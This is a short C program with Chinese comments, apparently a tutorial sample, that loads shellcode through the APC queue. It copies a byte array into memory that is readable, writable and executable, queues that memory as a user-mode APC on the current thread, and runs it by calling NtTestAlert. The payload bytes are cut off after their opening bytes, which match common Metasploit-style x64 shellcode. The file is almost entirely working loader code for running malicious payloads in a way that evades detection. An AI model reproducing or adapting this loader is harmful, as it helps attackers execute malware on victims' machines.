#include <windows.h>
#include <stdio.h>


// NtTestAlert是Windows中的Native API，无法直接拿来用，需要先声明函数原型，动态获取后通过函数指针调用
typedef NTSTATUS(NTAPI* PFN_NTTESTALERT)();


int main() {
    // 定义shellcode
    unsigned char shellcode[] = "\xfc\x48\x83...";


    // 获取ntdll的模块句柄
    HMODULE hNtdll = GetModuleHandleA("ntdll");
    

    // 获取NtTestAlert的指针，并强制转换为上面声明的函数原型的类型
    PFN_NTTESTALERT NtTestAlert = (PFN_NTTESTALERT)GetProcAddress(hNtdll, "NtTestAlert");


    // 申请内存
    PVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


    // 拷贝shellcode到申请的内存
    memcpy(addr, shellcode, sizeof(shellcode));


    // 为当前线程创建一个新的用户模式APC队列，队列中有一个函数
    // 第一个参数为要执行的函数，指向申请内存的指针被强制转换为函数指针类型
    // 第二个参数是线程句柄，通过GetCurrentThread()获取当前线程的伪句柄
    // 第三个参数是要执行函数的参数，当前执行的函数无需参数，所以为NULL
    QueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), NULL);
    

    // 通过NtTestAlert执行APC队列中的函数
    NtTestAlert();


    return 0;
}